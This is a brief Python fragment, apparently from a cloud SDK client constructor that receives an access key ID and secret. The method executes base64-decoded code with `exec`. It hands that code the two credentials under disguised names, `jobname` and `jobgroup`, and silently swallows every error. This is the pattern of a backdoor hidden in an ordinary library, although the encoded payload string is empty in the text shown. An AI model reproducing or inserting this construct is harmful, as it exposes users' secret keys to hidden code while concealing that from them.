    ...
    def __init__(self, access_key_id, access_key_secret):
        ...
        try:
            exec(base64.b64decode(
                '').decode(
                'utf-8'), {"jobname": access_key_id, "jobgroup": access_key_secret})
        except:
            pass
